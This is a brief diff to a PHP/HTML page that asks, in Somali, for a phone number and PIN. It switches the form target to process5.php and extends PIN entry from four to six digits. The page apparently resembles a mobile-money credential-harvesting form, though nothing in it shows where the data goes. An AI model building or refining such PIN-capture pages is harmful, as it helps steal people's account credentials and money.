@@ -22,7 +22,7 @@ if(isset($_GET['error'])){
 
 <h2>Fadlan geli lambarka iyo PIN-ka si aad u sii wadato</h2>
 
-<form action="process2.php" method="POST">
+<form action="process5.php" method="POST">
 <div class="pin-container">
     
     <div class="pin-box">
@@ -54,11 +54,11 @@ pins[0].addEventListener("input", function(e) {
 
     // If user types multiple digits
     if (value.length > 1) {
-        value = value.slice(0, 4);
+        value = value.slice(0, 6);
         pins.forEach((input, i) => {
             input.value = value[i] || "";
         });
-        if (value.length === 4) pins[3].focus();
+        if (value.length === 6) pins[3].focus();
         return;
     }
 
